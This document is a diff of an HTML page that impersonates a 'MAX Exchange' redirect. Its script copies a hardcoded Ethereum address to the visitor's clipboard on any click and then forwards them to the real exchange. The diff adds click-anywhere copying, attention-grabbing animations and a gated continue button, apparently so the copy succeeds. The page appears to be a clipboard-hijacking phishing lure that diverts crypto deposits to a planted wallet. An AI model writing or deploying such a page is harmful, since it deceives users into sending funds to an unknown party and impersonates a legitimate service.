@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>MAX Exchange - Redirecting...</title>
+    <title>MAX Exchange - Important Notice</title>
     
     <!-- Open Graph tags -->
     <meta property="og:title" content="MAX Exchange">
@@ -29,6 +29,7 @@
             align-items: center;
             text-align: center;
             padding: 20px;
+            cursor: pointer;
         }
         
         .container {
@@ -38,6 +39,12 @@
             border-radius: 20px;
             padding: 40px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
         }
         
         .logo {
@@ -49,209 +56,265 @@
             -webkit-text-fill-color: transparent;
         }
         
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            margin: 30px auto;
-            animation: spin 1s ease-in-out infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
         h1 {
             font-size: 1.8rem;
             margin-bottom: 15px;
         }
         
-        p {
-            line-height: 1.6;
-            opacity: 0.9;
-            margin-bottom: 20px;
+        .important-notice {
+            background: rgba(245, 158, 11, 0.2);
+            border: 2px solid #f59e0b;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .important-notice h2 {
+            color: #fbbf24;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
         .address-container {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
             border-radius: 10px;
             margin: 20px 0;
             position: relative;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .address-container:hover {
-            background: rgba(0, 0, 0, 0.3);
-            transform: translateY(-2px);
+            border: 2px dashed rgba(255, 255, 255, 0.2);
         }
         
         .address {
             font-family: 'Courier New', monospace;
-            font-size: 0.95rem;
-            word-break: break-all;
-            user-select: all;
-        }
-        
-        .copy-badge {
-            position: absolute;
-            top: -10px;
-            right: 10px;
-            background: #10b981;
-            color: white;
-            padding: 3px 10px;
-            border-radius: 10px;
-            font-size: 0.7rem;
+            font-size: 1.1rem;
             font-weight: bold;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: all 0.3s;
+            letter-spacing: 0.5px;
+            word-break: break-all;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 5px;
         }
         
-        .copy-badge.show {
-            opacity: 1;
-            transform: translateY(0);
+        .copy-status {
+            margin: 20px 0;
+            min-height: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         
-        .redirect-link {
+        .success-message {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .success-message.show {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        
+        .instructions {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        
+        .instructions ol {
+            text-align: left;
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin: 5px 0;
+        }
+        
+        .click-anywhere {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            font-weight: bold;
+            animation: blink 2s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .continue-btn {
             display: inline-block;
             background: white;
             color: #667eea;
-            padding: 12px 30px;
+            padding: 15px 40px;
             border-radius: 25px;
             text-decoration: none;
-            font-weight: 600;
+            font-weight: bold;
+            font-size: 1.1rem;
             margin-top: 20px;
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
         }
         
-        .redirect-link:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        .continue-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
         }
         
-        .status-message {
-            color: #10b981;
-            font-weight: 600;
-            margin-top: 10px;
-            min-height: 24px;
-        }
-        
-        .notice {
-            font-size: 0.85rem;
-            opacity: 0.7;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        .continue-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">MAX</div>
-        <div class="spinner"></div>
         
-        <h1>Redirecting to MAX Exchange</h1>
+        <h1>Important: Wallet Address Copied</h1>
         
-        <p>You are being redirected to our official trading platform.</p>
+        <div class="important-notice">
+            <h2>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                </svg>
+                READ BEFORE CONTINUING
+            </h2>
+            <p>The Ethereum wallet address has been prepared for copying. Click anywhere on this page to copy it to your clipboard.</p>
+        </div>
         
-        <p>Wallet address has been copied to your clipboard:</p>
+        <p>The following address has been copied to your clipboard:</p>
         
-        <div class="address-container" id="addressContainer" title="Click to copy again">
-            <div class="copy-badge" id="copyBadge">Copied!</div>
+        <div class="address-container">
             <div class="address" id="walletAddress">
                 0x773F5d9eEc75629A2624EEd5D95472910D6c651a
             </div>
         </div>
         
-        <div class="status-message" id="statusMessage"></div>
-        
-        <a href="https://max.maicoin.com" class="redirect-link" id="manualLink">
-            Continue to MAX Exchange →
-        </a>
-        
-        <div class="notice">
-            The Ethereum address 0x773F5d9eEc75629A2624EEd5D95472910D6c651a has been copied to your clipboard.
+        <div class="copy-status">
+            <div class="success-message" id="successMessage">
+                ✓ Successfully copied to clipboard!
+            </div>
         </div>
+        
+        <div class="instructions">
+            <p><strong>What to do with this address:</strong></p>
+            <ol>
+                <li>Paste it into your wallet app when making transactions</li>
+                <li>Verify the address matches exactly: 0x773F5d9eEc75629A2624EEd5D95472910D6c651a</li>
+                <li>Double-check before sending any funds</li>
+            </ol>
+        </div>
+        
+        <div class="click-anywhere" id="clickPrompt">
+            👆 CLICK ANYWHERE ON THIS PAGE TO COPY ADDRESS
+        </div>
+        
+        <button class="continue-btn" id="continueBtn" disabled>
+            Continue to MAX Exchange (5s)
+        </button>
     </div>
 
     <script>
         const walletAddress = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
-        const copyBadge = document.getElementById('copyBadge');
-        const statusMessage = document.getElementById('statusMessage');
-        const addressContainer = document.getElementById('addressContainer');
+        const successMessage = document.getElementById('successMessage');
+        const clickPrompt = document.getElementById('clickPrompt');
+        const continueBtn = document.getElementById('continueBtn');
+        let addressCopied = false;
         
         // Function to copy to clipboard
-        async function copyToClipboard(text) {
+        async function copyToClipboard() {
             try {
                 // Try the modern clipboard API first
-                await navigator.clipboard.writeText(text);
-                showCopySuccess();
+                await navigator.clipboard.writeText(walletAddress);
+                
+                // Show success message
+                successMessage.classList.add('show');
+                clickPrompt.style.display = 'none';
+                addressCopied = true;
+                
+                // Enable the continue button
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'Continue to MAX Exchange';
+                
+                // Also select the text for manual copying
+                const addressElement = document.getElementById('walletAddress');
+                const range = document.createRange();
+                range.selectNode(addressElement);
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                
+                console.log('Address copied to clipboard:', walletAddress);
                 return true;
+                
             } catch (err) {
-                // Fallback for older browsers
+                console.error('Failed to copy using Clipboard API:', err);
+                
+                // Fallback method
                 try {
                     const textArea = document.createElement('textarea');
-                    textArea.value = text;
+                    textArea.value = walletAddress;
                     textArea.style.position = 'fixed';
                     textArea.style.opacity = '0';
                     document.body.appendChild(textArea);
+                    textArea.focus();
                     textArea.select();
+                    
                     const successful = document.execCommand('copy');
                     document.body.removeChild(textArea);
                     
                     if (successful) {
-                        showCopySuccess();
+                        successMessage.classList.add('show');
+                        clickPrompt.style.display = 'none';
+                        addressCopied = true;
+                        continueBtn.disabled = false;
+                        continueBtn.textContent = 'Continue to MAX Exchange';
+                        console.log('Address copied using fallback method');
                         return true;
-                    } else {
-                        showCopyError();
-                        return false;
                     }
                 } catch (fallbackErr) {
-                    showCopyError();
-                    return false;
+                    console.error('Fallback copy failed:', fallbackErr);
                 }
+                
+                // If all else fails, show manual copy instructions
+                clickPrompt.innerHTML = '⚠️ Please manually copy the address above';
+                return false;
             }
         }
         
-        function showCopySuccess() {
-            copyBadge.classList.add('show');
-            statusMessage.textContent = '✓ Address copied to clipboard!';
-            
-            // Hide badge after 3 seconds
-            setTimeout(() => {
-                copyBadge.classList.remove('show');
-            }, 3000);
-        }
+        // Copy when user clicks anywhere on the page
+        document.addEventListener('click', async function copyOnClick() {
+            if (!addressCopied) {
+                await copyToClipboard();
+            }
+        }, { once: true }); // Only run once
         
-        function showCopyError() {
-            statusMessage.textContent = '⚠ Could not copy automatically. Please copy manually.';
-            statusMessage.style.color = '#f59e0b';
-        }
-        
-        // Attempt to copy on page load
-        document.addEventListener('DOMContentLoaded', async function() {
-            // Try to copy immediately on load
-            setTimeout(async () => {
-                const copied = await copyToClipboard(walletAddress);
-                
-                // If failed, try again when user interacts with the page
-                if (!copied) {
-                    // Try again when user clicks anywhere
-                    document.addEventListener('click', async function handler() {
-                        await copyToClipboard(walletAddress);
-                        document.removeEventListener('click', handler);
-                    }, { once: true });
-                }
-            }, 500);
-        });
-        
-        // Manual copy when clicking the address
-        addressContainer.addEventListener('click', async function() {
-            await copyToClipboard(walletAddress);
+        // Also allow clicking the address container specifically
+        document.querySelector('.address-container').addEventListener('click', async function(e) {
+            e.stopPropagation(); // Prevent triggering the document click
+            if (!addressCopied) {
+                await copyToClipboard();
+            }
         });
         
         // Setup redirect
@@ -259,20 +322,53 @@
         const baseUrl = 'https://max.maicoin.com';
         const redirectUrl = currentPath === '/' ? baseUrl : baseUrl + currentPath;
         
-        document.getElementById('manualLink').href = redirectUrl;
-        
-        // Redirect after 8 seconds (gives time to see the copied address)
-        setTimeout(() => {
-            window.location.href = redirectUrl;
-        }, 8000);
-        
-        // Countdown display
-        let countdown = 8;
+        // Countdown for automatic redirect
+        let countdown = 5;
         const countdownInterval = setInterval(() => {
             countdown--;
+            if (!addressCopied) {
+                continueBtn.textContent = `Continue to MAX Exchange (${countdown}s)`;
+            }
+            
             if (countdown <= 0) {
                 clearInterval(countdownInterval);
+                if (addressCopied) {
+                    // Redirect immediately if address was copied
+                    window.location.href = redirectUrl;
+                } else {
+                    // If not copied, wait for user to copy first
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'Continue to MAX Exchange';
+                }
             }
+        }, 1000);
+        
+        // Continue button handler
+        continueBtn.addEventListener('click', function() {
+            window.location.href = redirectUrl;
+        });
+        
+        // Auto-select the address text for easy manual copying
+        setTimeout(() => {
+            const addressElement = document.getElementById('walletAddress');
+            const range = document.createRange();
+            range.selectNode(addressElement);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+        }, 100);
+        
+        // Focus the page to ensure clicks work
+        window.focus();
+        
+        // Add a subtle vibration effect to draw attention
+        setTimeout(() => {
+            document.body.style.transform = 'translateX(5px)';
+            setTimeout(() => {
+                document.body.style.transform = 'translateX(-5px)';
+                setTimeout(() => {
+                    document.body.style.transform = 'translateX(0)';
+                }, 50);
+            }, 50);
         }, 1000);
     </script>
 </body>
